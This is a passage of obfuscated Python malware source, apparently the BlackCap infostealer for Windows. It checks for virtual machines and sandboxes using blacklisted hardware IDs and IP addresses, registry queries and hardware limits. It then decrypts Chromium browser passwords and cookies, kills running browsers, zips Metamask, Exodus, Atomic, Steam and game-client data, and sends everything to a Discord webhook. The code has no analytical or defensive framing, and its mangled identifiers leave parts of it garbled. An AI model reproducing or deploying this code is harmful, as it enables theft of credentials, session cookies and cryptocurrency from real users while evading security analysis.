             "EB16924B-FB6D-4FA1-8666-17B91F62FB37",
             "F3EA4E00-3C5F-11EA-8000-3CECEF440016",
             "F5744000-3C78-11EA-8000-3CECEF43FEFE",
             "F5BB1742-D36D-A11E-6580-2EA2427B0038",
             "F5EFEEAC-96A0-11EB-8365-FAFE299935A9",
             "F68B2042-E3A7-2ADA-ADBC-A6274307A317",
             "F705420F-0BB3-4688-B75C-6CD1352CABA9",
             "F91C9458-6656-4E83-B84A-13641DE92949",
             "F9E41000-3B35-11EA-8000-3CECEF440150",
             "FA612E42-DC79-4F91-CA17-1538AD635C95",
             "FA8C2042-205D-13B0-FCB5-C5CC55577A35",
             "FBC62042-5DE9-16AD-3F27-F818E5F68DD3",
             "FC40ACF8-DD97-4590-B605-83B595B0C4BA",
             "FCE23342-91F1-EAFC-BA97-5AAE4509E173",
             "FE455D1A-BE27-4BA4-96C8-967A6D3A9661",
             "FED63342-E0D6-C669-D53F-253D696D74DA",
             "FF577B79-782E-0A4D-8568-B35A9B7EB76B",
             "9CFF2042-2043-0340-4F9C-4BAE6DC5BB39",
             "D7AC2042-05F8-0037-54A6-38387D00B767",
             "52562042-B33F-C9D3-0149-241F40A0F5D8",
             "3E9AC505-812A-456F-A9E6-C7426582500E",
             "11E12042-2404-040A-31E4-27374099F748",
             "6E963342-B9C8-2D14-B057-C60C35722AD4",
             "9EB0FAF6-0713-4576-BD64-813DEE9E477E",
             "0B8A2042-2E8E-BECC-B6A4-7925F2163DC9",
             "89E32042-1B2B-5C76-E966-D4E363846FD4",
             "699400A5-AFC6-427A-A56F-CE63D3E121CB",
             "2F230ED7-5797-4DB2-BAA0-99A193503E4B",
             "3A512042-7806-4187-C90D-DA6925F74D0F",
             "074B2042-8EF0-B1EA-B32B-DEDCD4CED0D8",
             "B381F3F2-BEDC-4B70-B80A-1B6AF4977159"
        ]
        IIIIIIIllIllIIII.IIIIIIllIlIIllll = [   
             "10.200.169.204",
             "104.198.155.173",
             "109.145.173.169",
             "109.226.37.172",
             "109.74.154.90",
             "109.74.154.91",
             "109.74.154.92",
             "154.61.71.50",
             "154.61.71.51",
             "174.7.32.199",
             "176.63.4.179",
             "178.239.165.70",
             "188.105.165.80",
             "188.105.71.44",
             "188.105.91.116",
             "188.105.91.143",
             "188.105.91.173",
             "192.211.110.74",
             "192.40.57.234",
             "192.87.28.103",
             "193.128.114.45",
             "193.225.193.201",
             "194.154.78.152",
             "194.154.78.160",
             "194.154.78.210",
             "194.154.78.227",
             "194.154.78.230",
             "194.154.78.77",
             "194.186.142.178",
             "194.186.142.204",
             "195.181.175.103",
             "195.181.175.105",
             "195.239.51.3",
             "195.239.51.46",
             "195.239.51.59",
             "195.239.51.65",
             "195.239.51.80",
             "195.68.142.3",
             "195.74.76.222",
             "20.99.160.173",
             "204.101.161.31",
             "204.101.161.32",
             "207.102.138.83",
             "207.102.138.93",
             "208.78.41.115",
             "212.119.227.151",
             "212.119.227.167",
             "212.119.227.179",
             "212.119.227.184",
             "212.41.6.23",
             "213.33.142.50",
             "213.33.190.118",
             "213.33.190.171",
             "213.33.190.22",
             "213.33.190.227",
             "213.33.190.35",
             "213.33.190.46",
             "213.33.190.74",
             "23.128.248.46",
             "34.105.0.27",
             "34.105.183.68",
             "34.105.72.241",
             "34.138.96.23",
             "34.141.146.114",
             "34.141.245.25",
             "34.142.74.220",
             "34.145.195.58",
             "34.145.89.174",
             "34.253.248.228",
             "34.83.46.130",
             "34.85.243.241",
             "34.85.253.170",
             "35.192.93.107",
             "35.199.6.13",
             "35.229.69.227",
             "35.237.47.12",
             "45.8.148.171",
             "64.124.12.162",
             "67.218.111.202",
             "78.139.8.50",
             "79.104.209.109",
             "79.104.209.231",
             "79.104.209.24",
             "79.104.209.249",
             "79.104.209.33",
             "79.104.209.66",
             "80.211.0.97",
             "84.147.54.113",
             "84.147.54.61",
             "84.147.56.249",
             "84.147.60.41",
             "84.147.60.52",
             "84.147.61.28",
             "84.147.62.12",
             "84.147.63.171",
             "84.147.63.236",
             "87.166.48.65",
             "87.166.50.1",
             "87.166.50.213",
             "87.166.51.209",
             "88.132.225.100",
             "88.132.226.203",
             "88.132.227.238",
             "88.132.231.71",
             "88.153.199.169",
             "88.64.35.141",
             "88.66.107.75",
             "88.67.131.90",
             "88.86.117.130",
             "89.208.29.106",
             "89.208.29.140",
             "89.208.29.149",
             "89.208.29.64",
             "92.211.109.160",
             "92.211.192.144",
             "92.211.52.62",
             "92.211.55.199",
             "93.216.75.209",
             "95.25.204.90",
             "95.25.71.12",
             "95.25.71.5",
             "95.25.71.64",
             "95.25.71.70",
             "95.25.71.86",
             "95.25.71.89",
             "95.25.81.24",
             "84.57.200.69",
             "194.154.78.179",
             "213.33.190.242",
             "89.208.29.95",
             "95.25.71.65",
             "194.186.142.246",
             "213.33.190.42",
             "89.208.29.96",
             "89.208.29.97",
             "195.68.142.20",
             "79.104.209.221",
             "95.25.71.80",
             "194.186.142.180",
             "195.239.51.42",
             "79.104.209.172",
             "194.186.142.195",
             "194.154.78.91",
             "89.208.29.98",
             "95.25.71.92",
             "212.119.227.136",
             "95.25.71.112",
             "88.64.36.101",
             "213.33.190.109",
             "89.208.29.108",
             "194.186.142.236",
             "194.186.142.183",
             "95.25.71.87",
             "88.66.8.175",
             "213.33.190.69",
             "194.186.142.214",
             "79.104.209.36",
             "195.239.51.89",
             "172.105.89.202",
             "194.154.78.144",
             "194.154.78.169",
             "52.250.30.131"
             ]
        for IlllIlIIlIlIll in [IIIIIIIllIllIIII.IIlIIIlIl, IIIIIIIllIllIIII.lIllIIIIIIlIlIllI, IIIIIIIllIllIIII.IIlllllIlIlllllIIl]:
            IllllIIllIlIlI = threading.Thread(IIllIIlIlllII=IlllIlIIlIlIll, daemon=True)
            IIIIIIIllIllIIII.IIIIIlIIllIIII.append(IllllIIllIlIlI)
            IllllIIllIlIlI.start()
        for IIIIIIIll in IIIIIIIllIllIIII.IIIIIlIIllIIII:
            try:
                IIIIIIIll.join()
            except RuntimeError:
                continue
    def IlIllIlI(IIIIIIIllIllIIII):
        IIIIIIIllIllIIII.__class__.IlIllllIIIIIII = True
    def IIlIIIlIl(IIIIIIIllIllIIII):
        for lIllIIllI in [IIlllIIlIlIlI'D:\Tools', IIlllIIlIlIlI'D:\OS2', IIlllIIlIlIlI'D:\NT3X']:
            if ntpath.exists(lIllIIllI):
                IIIIIIIllIllIIII.IlIllIlI()
        for IIIllIlIIIlIlIIIIllI in IIIIIIIllIllIIII.IIllIIllI:
            if lIlllIIIlIlllIIIlIIl == IIIllIlIIIlIlIIIIllI:
                IIIIIIIllIllIIII.IlIllIlI()
        for IlllIlIlIIlllIlIl in IIIIIIIllIllIIII.llIlIIII:
            if IIIlIlIllIIIlIIIlII == IlllIlIlIIlllIlIl:
                IIIIIIIllIllIIII.IlIllIlI()
        for lIIlIIllIIIIIlllIll in IIIIIIIllIllIIII.IIIIIIllIlIIllll:
            if IIIIIIIllIllIIII.llllIllIIllllIllIIl()[0] == lIIlIIllIIIIIlllIll:
                IIIIIIIllIllIIII.IlIllIlI()
        for IIIllIIIlIIlIIlIll in IIIIIIIllIllIIII.lIIIllllllIIIIIlllll:
            if IIIIIIIllIllIIII.IlllIlll()[0] == IIIllIIIlIIlIIlIll:
                IIIIIIIllIllIIII.IlIllIlI()
    def IIlllllIlIlllllIIl(IIIIIIIllIllIIII):
        if int(IllIllIIIlll) <= 3: 
            IIIIIIIllIllIIII.IlIllIlI()
        if int(IIlllIIl) <= 120:  
            IIIIIIIllIllIIII.IlIllIlI()
        if int(psutil.cpu_count()) <= 1:
            IIIIIIIllIllIIII.IlIllIlI()
    def lIllIIIIIIlIlIllI(IIIIIIIllIllIIII):
        IIIIlIIllIlIIllIIIII = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul")
        llIlIlIIlIIlIIllIII = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul")
        if (IIIIlIIllIlIIllIIIII and llIlIlIIlIIlIIllIII) != 1:
            IIIIIIIllIllIIII.IlIllIlI()
        llIIlIIlIlIlIlIIIlI = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 'SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum')
        try:
            lIllIlIIIIIIIlllII = winreg.QueryValueEx(llIIlIIlIlIlIlIIIlI, '0')[0]
            if ("VMware" or "VBOX") in lIllIlIIIIIIIlllII:
                IIIIIIIllIllIIII.IlIllIlI()
        finally:
            winreg.CloseKey(llIIlIIlIlIlIlIIIlI)
if __name__ == "__main__" and os.IllIlIIlIIllIlIIlIl == "nt":
    asyncio.IIIIlIlIIIIl(IllIIllIllIIIlIlIIl().lIlIlIlIIllIlIllIIl())
IllIIlIIIIllIlllIll = os.getenv('LOCALAPPDATA')
IIIllIIllIlllIlllII = os.getenv('APPDATA')
IllIIlIllIllIIII = os.getenv("TEMP")
llIIIlIIIIlIlIIll = []
def lllllIIIll(IIlIlIIIlIlIIlII: str) -> str or bool | None:
        return IlIIlllIIllIIllI.get(IIlIlIIIlIlIIlII)
IllIIIlIll = lllllIIIll("yourwebhookurl")
class IIlIlllll(Structure):
    IlIllllllI = [
        ('cbData', wintypes.DWORD),
        ('pbData', POINTER(c_char))
    ]
def IlIllIIIIlIllIIlIII(llIllIlllIIl):
    llllIIIllIlIIl = int(llIllIlllIIl.llllIIIllIlIIl)
    IlIllIIllllIIlll = llIllIlllIIl.IlIllIIllllIIlll
    IlIIlIIlI = c_buffer(llllIIIllIlIIl)
    cdll.msvcrt.memcpy(IlIIlIIlI, IlIllIIllllIIlll, llllIIIllIlIIl)
    windll.kernel32.LocalFree(IlIllIIllllIIlll)
    return IlIIlIIlI.raw
def llIIllIlIllIIlIIll(lllIllIl, IlIIIlllIlllIlI=llIlIIIllll''):
    llllllllIlllIIIIlII = c_buffer(lllIllIl, len(lllIllIl))
    lIlIIlIl = c_buffer(IlIIIlllIlllIlI, len(IlIIIlllIlllIlI))
    IlllIIIIlIIlIlII = IIlIlllll(len(lllIllIl), llllllllIlllIIIIlII)
    IIIlIIlllIlllIIIlIlI = IIlIlllll(len(IlIIIlllIlllIlI), lIlIIlIl)
    llIllIlllIIl = IIlIlllll()
    if windll.crypt32.llIIllIlIllIIlIIll(byref(IlllIIIIlIIlIlII), None, byref(IIIlIIlllIlllIIIlIlI), None, None, 0x01, byref(llIllIlllIIl)):
        return IlIllIIIIlIllIIlIII(llIllIlllIIl)
def IlIIlIIIIIlll(llllIllIllIllIIllI, lllIIIlIlIlIIllI=None):
    llIlIIlIlIllI = llllIllIllIllIIllI.decode(encoding='utf8', errors='ignore')[:3]
    if llIlIIlIlIllI == 'v10' or llIlIIlIlIllI == 'v11':
        IlIlIllIIIlIllI = llllIllIllIllIIllI[3:15]
        llIllIIIlIIllIl = llllIllIllIllIIllI[15:]
        llllIIIlIIIlIIIIII = AES.new(lllIIIlIlIlIIllI, AES.MODE_GCM, IlIlIllIIIlIllI)
        lllIIlll = llllIIIlIIIlIIIIII.decrypt(llIllIIIlIIllIl)
        lllIIlll = lllIIlll[:-16].decode()
        return lllIIlll
def lIllllIlllllIIllII(lIlllIlIl, llIlIlIlIIIIIIIIIl, IlIlIlIllllIlIIlII='', files='', headers=''):
    for lIIllllllIl in range(8):
        try:
            if lIlllIlIl == 'POST':
                if IlIlIlIllllIlIIlII != '':
                    IIlllIIlIlIlI = requests.post(llIlIlIlIIIIIIIIIl, IlIlIlIllllIlIIlII=IlIlIlIllllIlIIlII)
                    if IIlllIIlIlIlI.status_code == 200:
                        return IIlllIIlIlIlI
                elif IIllIIIIlIllIllII != '':
                    IIlllIIlIlIlI = requests.post(llIlIlIlIIIIIIIIIl, IIllIIIIlIllIllII=IIllIIIIlIllIllII)
                    if IIlllIIlIlIlI.status_code == 200 or IIlllIIlIlIlI.status_code == 413: 
                        return IIlllIIlIlIlI
        except:
            pass
def lllllIlIlIlIlllllll(IllIIIlIll, IlIlIlIllllIlIIlII='', files='', headers=''):
    for lIIllllllIl in range(8):
        try:
            if IIllIlIIlIIl != '':
                IIlllIIlIlIlI = urlopen(Request(IllIIIlIll, IlIlIlIllllIlIIlII=IlIlIlIllllIlIIlII, IIllIlIIlIIl=IIllIlIIlIIl))
                return IIlllIIlIlIlI
            else:
                IIlllIIlIlIlI = urlopen(Request(IllIIIlIll, IlIlIlIllllIlIIlII=IlIlIlIllllIlIIlII))
                return IIlllIIlIlIlI
        except:
            pass
def IIlIllllll(llIlIIllllI):
    global IllIlIlllIIl
    IlIlIlIllllIlIIlII = str(llIlIIllllI)
    IIlIllIIIllI = re.findall(".google.com", IlIlIlIllllIlIIlII)
    if len(IIlIllIIIllI) < -1:
        IllIlIlllIIl = True
        return IllIlIlllIIl
    else:
        IllIlIlllIIl = False
        return IllIlIlllIIl
def llllIIIl(IIIlIIIlllllIll):
    IIlIlIIIlIlIIlII = re.findall("(\w+[a-z])",IIIlIIIlllllIll)
    while "https" in IIlIlIIIlIlIIlII: IIlIlIIIlIlIIlII.remove("https")
    while "com" in IIlIlIIIlIlIIlII: IIlIlIIIlIlIIlII.remove("com")
    while "net" in IIlIlIIIlIlIIlII: IIlIlIIIlIlIIlII.remove("net")
    return list(set(IIlIlIIIlIlIIlII))
def IIllIlIlIlI(IllIlIIlIIllIlIIlIl, lIIlIlIIllllIIlll=''):
    IIllIlIIlIIl = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    if IllIlIIlIIllIlIIlIl == "bc_checking":
        IlIlIlIllllIlIIlII = {
        "content": '',
        "embeds": [
            {
            "fields": [
                {
                "name": "Interesting files found on user PC:",
                "value": lIIlIlIIllllIIlll
                }
            ],
            "author": {
                'name': lIIIIllIlIIIllIIl'asd',
                'url': 'https://github.com/dscKSCH',
                'icon_url': 'https://raw.githubusercontent.com/KSCHdsc/DestruCord-Inject/main/blackcap.gif'
            },
            "footer": {
                "text": "aasd"
            },
            'color': 374276,
            }
        ],
        "avatar_url": "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png",
        "attachments": []
        }
        lllllIlIlIlIlllllll(IllIIIlIll, IlIlIlIllllIlIIlII=dumps(IlIlIlIllllIlIIlII).encode(), IIllIlIIlIIl=IIllIlIIlIIl)
        return
    lIllIIllI = IllIlIIlIIllIlIIlIl
    IIllIIIIlIllIllII = {'file': open(lIllIIllI, 'rb')}
    if "bc_allpasswords" in IllIlIIlIIllIlIIlIl:
        IIIlllllllIIllIIllII = ' | '.join(lIIlllIl for lIIlllIl in IlllIIIlIIlll)
        if len(IIIlllllllIIllIIllII) > 1000:
            llIIlIllIIllIIl = llllIIIl(str(IlllIIIlIIlll))
            IIIlllllllIIllIIllII = ' | '.join(lIIlllIl for lIIlllIl in llIIlIllIIllIIl)
        IlIlIlIllllIlIIlII = {
        "content": '',
        "embeds": [
            {
            "fields": [
                {
                "name": "Passwords Found:",
                "value": IIIlllllllIIllIIllII
                }
            ],
            "author": {
                'name': lIIIIllIlIIIllIIl'asd',
                'url': 'https://github.com/KSaasdsc',
                'icon_url': 'https://raw.githubusercontent.com/KSCHdsc/DestruCord-Inject/main/blackcap.gif'
            },
            "footer": {
                "text": "asd",
            },
            'color': 374276,
            }
        ],
         "avatar_url": "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png",
        "attachments": []
        }
        lllllIlIlIlIlllllll(IllIIIlIll, IlIlIlIllllIlIIlII=dumps(IlIlIlIllllIlIIlII).encode(), IIllIlIIlIIl=IIllIlIIlIIl)
    if "bc_allcookies" in IllIlIIlIIllIlIIlIl:
        llllllII = ' | '.join(lIIlllIl for lIIlllIl in lllIIIIllII)
        if len(llllllII) > 1000:
            IllIIIIlIIIIIIIIllll = llllIIIl(str(lllIIIIllII))
            llllllII = ' | '.join(lIIlllIl for lIIlllIl in IllIIIIlIIIIIIIIllll)
        IlIlIlIllllIlIIlII = {
        "content": '',
        "embeds": [
            {
            "fields": [
                {
                "name": "Cookies Found:",
                "value": llllllII
                }
            ],
            "author": {
                'name': lIIIIllIlIIIllIIl'asd',
                'url': 'https://github.com/KSCHdsc',
                'icon_url': 'https://raw.githubusercontent.com/KSCHdsc/DestruCord-Inject/main/blackcap.gif'
            },
            "footer": {
                "text": "asd",
            },
            'color': 374276,
            }
        ],
         "avatar_url": "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png",
        "attachments": []
        }
        lllllIlIlIlIlllllll(IllIIIlIll, IlIlIlIllllIlIIlII=dumps(IlIlIlIllllIlIIlII).encode(), IIllIlIIlIIl=IIllIlIIlIIl)
    lIllllIlllllIIllII("POST", IllIIIlIll, IIllIIIIlIllIllII=IIllIIIIlIllIllII)
def llIIlllIlI(IlIlIlIllllIlIIlII, IllIlIIlIIllIlIIlIl):
    lIllIIllI = os.getenv("TEMP") + lIIIIllIlIIIllIIl"\{nllIlIlIIIIIIllIlIIlmIIlIlIIIlIlIIIlIIlllIIII}.txt"
    with open(lIllIIllI, mode='w', encoding='utf-8') as lIIIIllIlIIIllIIl:
        lIIIIllIlIIIllIIl.write(lIIIIllIlIIIllIIl"asd | https://github.com/asd\n\n")
        for IIIIIIllllIIIllll in IlIlIlIllllIlIIlII:
            if IIIIIIllllIIIllll[0] != '':
                lIIIIllIlIIIllIIl.write(lIIIIllIlIIIllIIl"{IIIIIIllllIIIlllIlIIlllII}\n")
lIlIlIlIl = []
def IIIllIIIll(lIllIIllI, IIllIlIllIIIlIllII):
    global lIlIlIlIl
    if not os.lIllIIllI.exists(lIllIIllI): return
    IllIIIlllI = lIllIIllI + IIllIlIllIIIlIllII + "/Login Data"
    if os.stat(IllIIIlllI).st_size == 0: return
    llIIlIIllIlllllI = IllIIlIllIllIIII + "blackcaped" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
    shutil.copy2(IllIIIlllI, llIIlIIllIlllllI)
    lIIlllIlll = connect(llIIlIIllIlllllI)
    llIIlIlllIIIlIllIl = lIIlllIlll.llIIlIlllIIIlIllIl()
    llIIlIlllIIIlIllIl.execute("SELECT action_url, username_value, password_value FROM logins;")
    IlIlIlIllllIlIIlII = llIIlIlllIIIlIllIl.fetchall()
    llIIlIlllIIIlIllIl.close()
    lIIlllIlll.close()
    os.remove(llIIlIIllIlllllI)
    IIIIlllIlIllI = lIllIIllI + "/Local State"
    with open(IIIIlllIlIllI, 'r', encoding='utf-8') as lIIIIllIlIIIllIIl: IllIllIlllIllll = loads(lIIIIllIlIIIllIIl.read())
    lllIIIlIlIlIIllI = b64decode(IllIllIlllIllll['os_crypt']['encrypted_key'])
    lllIIIlIlIlIIllI = llIIllIlIllIIlIIll(lllIIIlIlIlIIllI[5:])
    for lIlllIlIIIlIl in IlIlIlIllllIlIIlII:
        if lIlllIlIIIlIl[0] != '':
            for IIIlIlIIlIIIlIIlI in lIlIIllIIIIIlIllIIlI:
                IIIlIIlIlIlIIllIllIl = IIIlIlIIlIIIlIIlI
                if "https" in IIIlIlIIlIIIlIIlI:
                    IllIlIllIIllIIIlI = IIIlIlIIlIIIlIIlI
                    IIIlIlIIlIIIlIIlI = IllIlIllIIllIIIlI.split('[')[1].split(']')[0]
                if IIIlIlIIlIIIlIIlI in lIlllIlIIIlIl[0]:
                    if not IIIlIIlIlIlIIllIllIl in IlllIIIlIIlll: IlllIIIlIIlll.append(IIIlIIlIlIlIIllIllIl)
            lIlIlIlIl.append(lIIIIllIlIIIllIIl"URL: {row[0]} \n ID: {row[1]} \n PASSW0RD: {IlIIlIIIIIlll(lIlllIlIIIlIl[2], mllIlIlIIIIIIllIlIIlsIIIIIIIlleIIlllIIlIlIlIlIlIIlIllllllIlIIIIlkIIlIlIIIlIlIIlIIllIIllIIIllIIlIIlIIlllII)}\n\n")
    llIIlllIlI(lIlIlIlIl, 'bc_allpasswords')
llIlIIllllI = []
def IIIIIllIIlIlIIlIl(lIllIIllI, IIllIlIllIIIlIllII):
    global llIlIIllllI
    if not os.lIllIIllI.exists(lIllIIllI): return
    IllIIIlllI = lIllIIllI + IIllIlIllIIIlIllII + "/Cookies"
    if os.stat(IllIIIlllI).st_size == 0: return
    llIIlIIllIlllllI = IllIIlIllIllIIII + "blackcaped" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
    shutil.copy2(IllIIIlllI, llIIlIIllIlllllI)
    lIIlllIlll = connect(llIIlIIllIlllllI)
    llIIlIlllIIIlIllIl = lIIlllIlll.llIIlIlllIIIlIllIl()
    llIIlIlllIIIlIllIl.execute("SELECT host_key, name, encrypted_value FROM cookies")
    IlIlIlIllllIlIIlII = llIIlIlllIIIlIllIl.fetchall()
    llIIlIlllIIIlIllIl.close()
    lIIlllIlll.close()
    os.remove(llIIlIIllIlllllI)
    IIIIlllIlIllI = lIllIIllI + "/Local State"
    with open(IIIIlllIlIllI, 'r', encoding='utf-8') as lIIIIllIlIIIllIIl: IllIllIlllIllll = loads(lIIIIllIlIIIllIIl.read())
    lllIIIlIlIlIIllI = b64decode(IllIllIlllIllll['os_crypt']['encrypted_key'])
    lllIIIlIlIlIIllI = llIIllIlIllIIlIIll(lllIIIlIlIlIIllI[5:])
    for lIlllIlIIIlIl in IlIlIlIllllIlIIlII:
        if lIlllIlIIIlIl[0] != '':
            for IIIlIlIIlIIIlIIlI in lIlIIllIIIIIlIllIIlI:
                IIIlIIlIlIlIIllIllIl = IIIlIlIIlIIIlIIlI
                if "https" in IIIlIlIIlIIIlIIlI:
                    IllIlIllIIllIIIlI = IIIlIlIIlIIIlIIlI
                    IIIlIlIIlIIIlIIlI = IllIlIllIIllIIIlI.split('[')[1].split(']')[0]
                if IIIlIlIIlIIIlIIlI in lIlllIlIIIlIl[0]:
                    if not IIIlIIlIlIlIIllIllIl in lllIIIIllII: lllIIIIllII.append(IIIlIIlIlIlIIllIllIl)
            llIlIIllllI.append(lIIIIllIlIIIllIIl"{lIlllIlIIIlIl[0]}	TRUE"+"		"+ f"/FALSE	2597573456	{lIlllIlIIIlIl[1]}	{IlIIlIIIIIlll(lIlllIlIIIlIl[2], lllIIIlIlIlIIllI)}")
    llIIlllIlI(llIlIIllllI, 'bc_allcookies')
def IllIlllIlllII(lllIlIlIl):
    for IIIIIllIIlIIll in psutil.process_iter():
        try:
            if lllIlIlIl.lower() in IIIIIllIIlIIll.IllIlIIlIIllIlIIlIl().lower():
                return True
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    return False;
def IllIlIIlIllIIIIlII(lIllIIllI, IIllIlIllIIIlIllII, lIIllIIlIIIllI):
    IllIIIlllI = lIllIIllI
    IllIlIIlIIllIlIIlIl = IIllIlIllIIIlIllII
    if "aholpfdialjgjfhomihkjbmgjidlcdno" in IIllIlIllIIIlIllII:
        llIIlllllllIIlllI = lIllIIllI.split("\\")[4].split("/")[1].replace(' ', '')
        IllIlIIlIIllIlIIlIl = lIIIIllIlIIIllIIl"Exodus_{llIIlllllllIIllIlIIlllIII}"
        IllIIIlllI = lIllIIllI + IIllIlIllIIIlIllII
    if "nkbihfbeogaeaoehlefnkodbefgpgknn" in IIllIlIllIIIlIllII:
        llIIlllllllIIlllI = lIllIIllI.split("\\")[4].split("/")[1].replace(' ', '')
        IllIlIIlIIllIlIIlIl = lIIIIllIlIIIllIIl"Metamask_{llIIlllllllIIllIlIIlllIII}"
        IllIIIlllI = lIllIIllI + IIllIlIllIIIlIllII
    if not os.lIllIIllI.exists(IllIIIlllI): return
    if IllIlllIlllII('chrome.exe'):
        print('Yes a chrome process was running')
        subprocess.Popen(lIIIIllIlIIIllIIl"taskkill /im {IIIIIllIIlIIllIlIlIIlllllIlIIlIIlllIII} /t /f", shell=True)
    else:
        ...
    if "Wallet" in IIllIlIllIIIlIllII or "NationsGlory" in IIllIlIllIIIlIllII:
        llIIlllllllIIlllI = lIllIIllI.split("\\")[4].split("/")[1].replace(' ', '')
        IllIlIIlIIllIlIIlIl = lIIIIllIlIIIllIIl"{llIIlllllllIIllIlIIlllIII}"
    elif "Steam" in IIllIlIllIIIlIllII:
        if not os.lIllIIllI.isfile(lIIIIllIlIIIllIIl"{pllIlIlIIIIIIllIlIIlIIIIIIIlIlIIlllIIhC}/loginusers.vdf"): return
        lIIIIllIlIIIllIIl = open(lIIIIllIlIIIllIIl"{pllIlIlIIIIIIllIlIIlIIIIIIIlIlIIlllIIhC}/loginusers.vdf", "r+", encoding="utf8")
        IlIlIlIllllIlIIlII = lIIIIllIlIIIllIIl.readlines()
        IllllllIIlIl = False
        for IlIIlllII in IlIlIlIllllIlIIlII:
            if 'RememberPassword"\IIIIIIIll\IIIIIIIll"1"' in IlIIlllII:
                IllllllIIlIl = True
        if IllllllIIlIl == False: return
        IllIlIIlIIllIlIIlIl = IIllIlIllIIIlIllII
    IlIlIlllII = zipfile.ZipFile(lIIIIllIlIIIllIIl"{paIIIIIIIllhC}/{nllIlIlIIIIIIllIlIIlmIIlIlIIIlIlIIIlIIlllIIII}.zip", "w")
    print(IlIlIlllII)
    for IlIlIlIll in os.listdir(IllIIIlllI):
        if not ".zip" in IlIlIlIll: IlIlIlllII.write(IllIIIlllI + "/" + IlIlIlIll)
    IlIlIlllII.close()
    IIllIlIlIlI(lIIIIllIlIIIllIIl'{paIIIIIIIllhC}/{nllIlIlIIIIIIllIlIIlmIIlIlIIIlIlIIIlIIlllIIII}.zip')
    os.remove(lIIIIllIlIIIllIIl"{paIIIIIIIllhC}/{nllIlIlIIIIIIllIlIIlmIIlIlIIIlIlIIIlIIlllIIII}.zip")
def llIlIIIIlllllIIIlIl():
    IIIlIIlIlIIII = [
        [lIIIIllIlIIIllIIl"{IIlllIIlIlIlIollIlIlIIIIIIllIlIIIlIIlllIImlIIllllllIlng}/Opera Software/Opera GX Stable",               "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [lIIIIllIlIIIllIIl"{IIlllIIlIlIlIollIlIlIIIIIIllIlIIIlIIlllIImlIIllllllIlng}/Opera Software/Opera Stable",                  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [lIIIIllIlIIIllIIl"{IIlllIIlIlIlIollIlIlIIIIIIllIlIIIlIIlllIImlIIllllllIlng}/Opera Software/Opera Neon/User Data/Default",  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [lIIIIllIlIIIllIIl"{loIlIlIIlllllIlIlIllIlIlIIIIIIllIlIIlIlIIlllII}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [lIIIIllIlIIIllIIl"{loIlIlIIlllllIlIlIllIlIlIIIIIIllIlIIlIlIIlllII}/Google/Chrome SxS/User Data",                    "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [lIIIIllIlIIIllIIl"{loIlIlIIlllllIlIlIllIlIlIIIIIIllIlIIlIlIIlllII}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",    "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [lIIIIllIlIIIllIIl"{loIlIlIIlllllIlIlIllIlIlIIIIIIllIlIIlIlIIlllII}/Yandex/YandexBrowser/User Data",                 "yandex.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn"                                    ],
        [lIIIIllIlIIIllIIl"{loIlIlIIlllllIlIlIllIlIlIIIIIIllIlIIlIlIIlllII}/CocCoc/Browsers/User Data",                      "browser.exe",  "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],        
        [lIIIIllIlIIIllIIl"{loIlIlIIlllllIlIlIllIlIlIIIIIIllIlIIlIlIIlllII}/Microsoft/Edge/User Data",                       "edge.exe",     "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ]
    ]
    lIIlllIlIllIlIlll = [
        [lIIIIllIlIIIllIIl"{IIlllIIlIlIlIollIlIlIIIIIIllIlIIIlIIlllIImlIIllllllIlng}/atomic/Local Storage/leveldb", '"Atomic Wallet.exe"', "Wallet"],
        [lIIIIllIlIIIllIIl"{IIlllIIlIlIlIollIlIlIIIIIIllIlIIIlIIlllIImlIIllllllIlng}/Exodus/exodus.wallet", "Exodus.exe", "Wallet"],
        ["C:\Program Files (x86)\Steam\config", "steam.exe", "Steam"],
        [lIIIIllIlIIIllIIl"{IIlllIIlIlIlIollIlIlIIIIIIllIlIIIlIIlllIImlIIllllllIlng}/NationsGlory/Local Storage/leveldb", "NationsGlory.exe", "NationsGlory"]
    ]
    for llIIlIlIIIIII in IIIlIIlIlIIII:
